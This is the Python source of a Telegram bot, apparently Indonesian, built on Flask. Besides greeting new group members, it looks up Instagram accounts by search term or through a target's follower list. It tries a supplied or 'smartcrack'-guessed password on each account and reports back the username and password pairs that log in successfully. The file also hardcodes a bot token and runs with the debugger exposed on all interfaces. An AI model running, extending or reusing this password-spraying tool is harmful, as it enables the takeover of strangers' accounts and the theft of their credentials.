import igtools
from flask import Flask,request
from requests import get
import os


token = '1086170630:AAH7we8c1Y2O22AkhTDYh5zmx9DxnN4vog4'
url = 'https://api.telegram.org/bot%s/' % token


otakBot = Flask(__name__)

def update(update):
	global id,np
	id = update['message']['chat']['id']
	try:
		np = update['message']['from']['username']
	except:
		np = update['message']['from']['first_name']
	tek = update['message']['text']
	cm = tek.split(' ')
	if 'new_chat_member' in str(update):
		nama_grup = update['message']['chat']['title']
		grup_id   = update['message']['chat']['id']
		mem_baru  = update['message']['new_chat_member']['first_name']
		teks      = 'Hai %s !\nSelamat datang di Grup %s' %(mem_baru,nama_grup)
		kirim_pesan(grup_id,teks)
	elif cm[0] == '/search':
		x=igtools.search(cm[1])
		f=str(x).replace('\'','\n').replace(',','')
		kirim_pesan(id,f)
	elif cm[0] == '/listfollower':
		x=igtools.get_followers(cm[1])
		f=str(x).replace('\'','\n').replace(',','')
		kirim_pesan(id,f)
	elif cm[0] == '/followersmartcrack':
		for i in igtools.get_followets(cm[1]):
			x=igtools.smartcrack(i)
			if x == False:
				kirim_pesan(id,'%s \ngagal'%(i))
			else:
				kirim_pesan(id,'%s %s'%(i,x))
	elif cm[0] == '/searchsmartcrack':
		for i in igtools.search(cm[1]):
			x=igtools.smartcrack(i)
			if x == False:
				kirim_pesan(id, 'gagal')
			else:
				kirim_pesan(id,str(x))
	elif cm[0] == '/searchcrack':
		for i in igtools.search(cm[1]):
			if igtools.login(i,cm[2]) == True:
				kirim_pesan(id,'username : %s\npassword : %s\nsukses'%(i,cm[2]))
			else:
				kirim_pesan(id,'username : %s\npassword : %s\ngagal'%(i,cm[2]))
	elif cm[0] == '/crackfollower':
		for i in igtools.get_followers(cm[1]):
			if igtools.login(i,cm[2]) == True:
				kirim_pesan(id,'username : %s\npassword : %s \nterambil' % (i,cm[2]))
			else:
				kirim_pesan(id,'username : %s\npassword : %s\ngagal' % (i,cm[2]))
     # disini bisa kita tambahin kode lainnya
     # misalnya membalas kalau ada oran yang ngechat ke bot kita 
     # dan kreasikan sesuai imajinasi kalian :)
		id = update['message']['chat']['id']
		kirim_pesan(id,'command :\n/crackfollower <username> <password>\n/search <username>\n/searchcrack <username> <password>\n/followersmartcrack <username>\n/listfollower <username>\n/searchsmartcrack <username>\nadmin : @krypton_bytes & @krypton_byte')
def kirim_pesan(id,teks):
	data = {
		'chat_id':id,
		'text':'@%s' % np+' result:\n%s' %teks
	}
	get(url+'sendMessage',params=data)


@otakBot.route('/',methods=['POST','GET'])
def index():
	if request.method == 'POST':
		data_update = request.get_json()
		update(data_update)
		return "oke"
	else:
		return 'LAST VERSION'

if __name__ == '__main__':
	otakBot.run(host='0.0.0.0',port=int(os.environ.get('PORT','5000')),debug=True)
